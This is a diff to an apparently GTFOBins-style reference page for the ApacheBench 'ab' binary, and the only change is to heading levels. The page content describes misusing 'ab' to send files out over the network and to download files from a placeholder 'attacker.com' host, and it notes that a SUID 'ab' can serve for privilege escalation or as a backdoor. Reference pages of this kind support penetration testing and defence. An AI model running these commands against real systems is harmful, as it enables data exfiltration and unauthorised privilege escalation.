@@ -7,7 +7,7 @@ tags: ["file upload","file download",suid,sudo]
 toc: false
 ---
 
-# File upload
+## File upload
 
 It can exfiltrate files on the network.
 
@@ -19,7 +19,7 @@ LFILE=file_to_send
 ab -p $LFILE $URL
 ```
 
-# File download
+## File download
 
 It can download remote files.
 
@@ -30,7 +30,7 @@ URL=http://attacker.com/file_to_download
 ab -v2 $URL
 ```
 
-# SUID
+## SUID
 
 If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.
 
